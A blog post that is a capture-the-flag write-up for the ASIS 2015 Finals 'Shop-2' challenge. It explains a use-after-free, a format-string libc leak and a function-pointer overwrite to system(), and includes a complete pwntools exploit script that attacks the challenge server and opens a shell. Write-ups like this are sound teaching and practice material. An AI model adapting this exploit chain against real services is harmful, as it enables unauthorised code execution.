---
layout: post
title: ASIS 2015 Finals: Shop-2
modified: 2015-10-14
tags: asis, asis2015finals, pwn
---

The second part of the challenge was exploiting a UAF (use-after-free) vulnerability.

This could be triggered if the admin deleted a "Bragisdumu" (btw what is a Bragisdumu!? :D).

But there were some restrictions, for example: the admin could only delete items if there were no stock of it, so we had to buy them first. But you could not buy any amount of them, only 16, so you had to buy the Knight Rider one.

Although the program tried to nullify the object, but it did not nullify the pointer, but the active field of the pointed object. And then deleted the object. So it did not trigged the vulnerability by itself, you also had to use a long enough username + password.

To make the exploit stable I had to leak some addresses. To do this I overwrite the whole item structure until the ptr value:

{% highlight %}
00000000 Item            struc ; (sizeof=0x88)   ; XREF: .data:globItemStructs9r
00000000 idx             dd ?                    ; XREF: .data:globItemPtrs16o
00000004 inited          db ?
00000005 name            db 100 dup(?)
00000069 mostPopular     db ?
0000006A align1          db 6 dup(?)
00000070 price           dq ?
00000078 stock           dd ?
0000007C align2          dd ?
00000080 ptr             dq ?
00000088 Item            ends
{% endhighlight %}

This way the address of the KnightRider preview function is leaked out, then I logged out and logged in with username which overwrite the preview function call (0x1275) to printf in the PLT (0xda0). As the parameter for this call is the Item structure's address which is fully controlled by me I could sent in a format string which contained a lot of "%p"'s, thus leaking out the libc base address from the stack (among other things).

Then in the next round I simple overwrite the pointer with the calculated system address and got a shell :)

{% highlight %}
The flag was: ASIS{5249b4cc1527739c57fbd04ab14292ca}
{% endhighlight %}

{% highlight python %}
#!/usr/bin/env python
from pwn import *
import re

adminPass = "ASIS{304b0f16eb430391c6c86ab0f3294211}"

r = remote('185.106.120.220', 1337)

r.send("guest\nguest\n2\n3\n2\n3\n8\nadmin\n"+adminPass+"\n5\n3\n8\nguest\nguest"+"A"*31+"\x01"+"C"*267+"\n3\n")
result = r.recvuntil("your orders?")
KnightRiderAddrStr = re.search('CCCC+(.*?), price', result, re.DOTALL).group(1) + '\x00\x00'
print 'KnightRider str = %r' % KnightRiderAddrStr
KnightRiderAddr = u64(KnightRiderAddrStr)
printfAddr = KnightRiderAddr - 0x1275 + 0xda0
print 'KnightRider addr = %x' % KnightRiderAddr
print 'printf addr = %x' % printfAddr

fs="%p|"*30;
r.send("0\n8\nguest\nguest"+"A"*31+"\x01|"+fs+"D"*(122-len(fs))+p64(printfAddr)+"\n3\n1\n")
r.recvuntil("your orders?")
leaks = r.recvline().split('|')
print leaks
baseLeak = int(leaks[4][2:], 16)
print "leak = %x" % baseLeak
systemAddr = baseLeak - 0x7ffff7dd4060 + 0x7ffff7a5b640
print "system = %x" % systemAddr

r.send("8\nguest\nguest"+"A"*27+"sh\x00\x00\x01"+"C"*123+p64(systemAddr)+"\n3\n1\n")
r.recvuntil("your orders?")
r.send('cat flag\n')
print 'Flag =' + r.recvline()
r.interactive()
{% endhighlight %}